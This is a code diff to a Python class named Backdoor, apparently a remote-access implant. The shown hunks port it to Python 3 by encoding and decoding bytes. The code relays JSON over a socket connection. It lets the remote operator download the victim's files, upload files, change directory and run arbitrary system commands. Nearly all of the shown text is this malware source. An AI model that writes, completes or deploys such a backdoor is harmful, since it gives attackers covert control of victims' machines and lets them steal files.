@@ -13,10 +13,10 @@ class Backdoor:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
@@ -51,11 +51,11 @@ class Backdoor:
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
-                    command_result = self.read_file(command[1])
+                    command_result = self.read_file(command[1]).decode()
                 elif command[0] == "upload":
-                    command_result = self.write_file(command[1], command[2])    
+                    command_result = self.write_file(command[1], command[2])   
                 else:    
-                    command_result = self.execute_system_command(command)
+                    command_result = self.execute_system_command(command).decode()
             
             except Exception:
                 command_result = "[-] Error during command execution"
